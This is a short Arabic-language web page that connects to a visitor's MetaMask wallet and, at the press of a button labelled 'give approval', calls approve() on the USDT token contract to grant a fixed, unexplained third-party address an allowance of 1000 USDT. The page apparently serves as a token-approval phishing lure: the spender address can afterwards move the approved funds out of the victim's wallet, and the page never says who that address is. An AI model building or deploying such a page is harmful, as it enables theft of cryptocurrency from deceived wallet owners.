<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>ربطسسس افقة</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      direction: rtl;
      text-align: center;
      background-color: #f5f5f5;
      padding: 50px;
    }
    button {
      background-color: #ff9900;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 10px;
      cursor: pointer;
      margin: 10px;
    }
    button:hover {
      background-color: #e68a00;
    }
    #walletStatus {
      margin-top: 20px;
      font-size: 16px;
      color: #333;
    }
  </style>
</head>
<body>

  <h1>ربط المحفظة والموافقة</h1>
  <button id="openMetaMask">افتح MetaMask</button>
  <button id="approveBtn" disabled>اعطِ الموافقة</button>
  <p id="walletStatus">...</p>

  <script>
    const openMetaMaskBtn = document.getElementById('openMetaMask');
    const approveBtn = document.getElementById('approveBtn');
    const walletStatus = document.getElementById('walletStatus');

    const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT
    const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';     // spender address

    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    openMetaMaskBtn.onclick = () => {
      if (typeof window.ethereum === 'undefined') {
        if (isMobile) {
          // حاول تفتح تطبيق MetaMask ب deep link
          const dappUrl = location.href.replace(/^https?:\/\//, '');
          const metamaskDeepLink = `metamask://dapp/${dappUrl}`;
          window.location.href = metamaskDeepLink;
          walletStatus.textContent = 'جارٍ فتح MetaMask، ارجع للصفحة واضغط "اعطِ الموافقة"';
        } else {
          walletStatus.textContent = 'يرجى تثبيت MetaMask على المتصفح.';
        }
        return;
      }
      walletStatus.textContent = 'MetaMask متاح، اضغط "اعطِ الموافقة" لإكمال العملية.';
      approveBtn.disabled = false;
    };

    approveBtn.onclick = async () => {
      walletStatus.textContent = 'جارٍ الاتصال بالمحفظة...';

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        const signer = provider.getSigner();
        const network = await provider.getNetwork();

        if (network.chainId !== 1) {
          walletStatus.textContent = 'يرجى التبديل إلى شبكة Ethereum Mainnet في MetaMask.';
          return;
        }

        const amount = ethers.utils.parseUnits("1000", 6); // 1000 USDT

        const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
        const tokenContract = new ethers.Contract(tokenAddress, abi, signer);

        walletStatus.textContent = 'جارٍ إرسال طلب الموافقة...';

        const tx = await tokenContract.approve(spender, amount);
        await tx.wait();

        walletStatus.textContent = 'تمت الموافقة بنجاح ✅';
      } catch (error) {
        console.error(error);
     walletStatus.textContent = 'فشل تنفيذ الموافقة ❌\n' + (error.message || error);
      }
    };
  </script>

</body>
</html>
